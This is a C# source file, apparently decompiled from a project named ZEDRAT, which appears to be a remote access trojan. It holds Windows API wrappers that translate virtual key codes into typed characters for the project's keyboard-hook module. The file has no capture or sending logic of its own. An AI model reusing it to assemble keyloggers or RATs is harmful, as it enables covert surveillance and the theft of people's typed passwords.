using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi
{
	internal static class KeyboardNativeMethods
	{
		internal enum MapType
		{
			MAPVK_VK_TO_VSC = 0,
			MAPVK_VSC_TO_VK = 1,
			MAPVK_VK_TO_CHAR = 2,
			MAPVK_VSC_TO_VK_EX = 3
		}

		public const byte VK_SHIFT = 16;

		public const byte VK_CAPITAL = 20;

		public const byte VK_NUMLOCK = 144;

		public const byte VK_LSHIFT = 160;

		public const byte VK_RSHIFT = 161;

		public const byte VK_LCONTROL = 162;

		public const byte VK_RCONTROL = 163;

		public const byte VK_LMENU = 164;

		public const byte VK_RMENU = 165;

		public const byte VK_LWIN = 91;

		public const byte VK_RWIN = 92;

		public const byte VK_SCROLL = 145;

		public const byte VK_INSERT = 45;

		public const byte VK_CONTROL = 17;

		public const byte VK_MENU = 18;

		public const byte VK_PACKET = 231;

		private static int lastVirtualKeyCode = 0;

		private static int lastScanCode = 0;

		private static byte[] lastKeyState = new byte[256];

		private static bool lastIsDead = false;

		internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int fuState, out char[] chars)
		{
			IntPtr activeKeyboard = KeyboardNativeMethods.GetActiveKeyboard();
			KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, KeyboardNativeMethods.MapVirtualKeyEx(virtualKeyCode, 0, activeKeyboard), fuState, activeKeyboard, out chars);
		}

		internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, out char[] chars)
		{
			KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, KeyboardNativeMethods.GetActiveKeyboard(), out chars);
		}

		internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl, out char[] chars)
		{
			StringBuilder stringBuilder = new StringBuilder(64);
			KeyboardState current = KeyboardState.GetCurrent();
			byte[] nativeState = current.GetNativeState();
			bool flag = false;
			if (current.IsDown(Keys.ShiftKey))
			{
				nativeState[16] = 128;
			}
			if (current.IsToggled(Keys.Capital))
			{
				nativeState[20] = 1;
			}
			switch (KeyboardNativeMethods.ToUnicodeEx(virtualKeyCode, scanCode, nativeState, stringBuilder, stringBuilder.Capacity, fuState, dwhkl))
			{
			case -1:
				flag = true;
				KeyboardNativeMethods.ClearKeyboardBuffer(virtualKeyCode, scanCode, dwhkl);
				chars = null;
				break;
			case 0:
				chars = null;
				break;
			case 1:
				if (stringBuilder.Length > 0)
				{
					chars = new char[1] { stringBuilder[0] };
				}
				else
				{
					chars = null;
				}
				break;
			default:
				if (stringBuilder.Length > 1)
				{
					chars = new char[2]
					{
						stringBuilder[0],
						stringBuilder[1]
					};
				}
				else
				{
					chars = new char[1] { stringBuilder[0] };
				}
				break;
			}
			if (KeyboardNativeMethods.lastVirtualKeyCode != 0 && KeyboardNativeMethods.lastIsDead)
			{
				if (chars != null)
				{
					StringBuilder stringBuilder2 = new StringBuilder(5);
					KeyboardNativeMethods.ToUnicodeEx(KeyboardNativeMethods.lastVirtualKeyCode, KeyboardNativeMethods.lastScanCode, KeyboardNativeMethods.lastKeyState, stringBuilder2, stringBuilder2.Capacity, 0, dwhkl);
					KeyboardNativeMethods.lastIsDead = false;
					KeyboardNativeMethods.lastVirtualKeyCode = 0;
				}
			}
			else
			{
				KeyboardNativeMethods.lastScanCode = scanCode;
				KeyboardNativeMethods.lastVirtualKeyCode = virtualKeyCode;
				KeyboardNativeMethods.lastIsDead = flag;
				KeyboardNativeMethods.lastKeyState = (byte[])nativeState.Clone();
			}
		}

		private static void ClearKeyboardBuffer(int vk, int sc, IntPtr hkl)
		{
			StringBuilder stringBuilder = new StringBuilder(10);
			while (KeyboardNativeMethods.ToUnicodeEx(vk, sc, new byte[255], stringBuilder, stringBuilder.Capacity, 0, hkl) < 0)
			{
			}
		}

		private static IntPtr GetActiveKeyboard()
		{
			int processId;
			return KeyboardNativeMethods.GetKeyboardLayout(ThreadNativeMethods.GetWindowThreadProcessId(ThreadNativeMethods.GetForegroundWindow(), out processId));
		}

		[DllImport("user32.dll")]
		[Obsolete("Use ToUnicodeEx instead")]
		public static extern int ToAscii(int uVirtKey, int uScanCode, byte[] lpbKeyState, byte[] lpwTransKey, int fuState);

		[DllImport("user32.dll")]
		public static extern int ToUnicodeEx(int wVirtKey, int wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, int wFlags, IntPtr dwhkl);

		[DllImport("user32.dll")]
		public static extern int GetKeyboardState(byte[] pbKeyState);

		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		public static extern short GetKeyState(int vKey);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		internal static extern int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		internal static extern IntPtr GetKeyboardLayout(int dwLayout);
	}
}
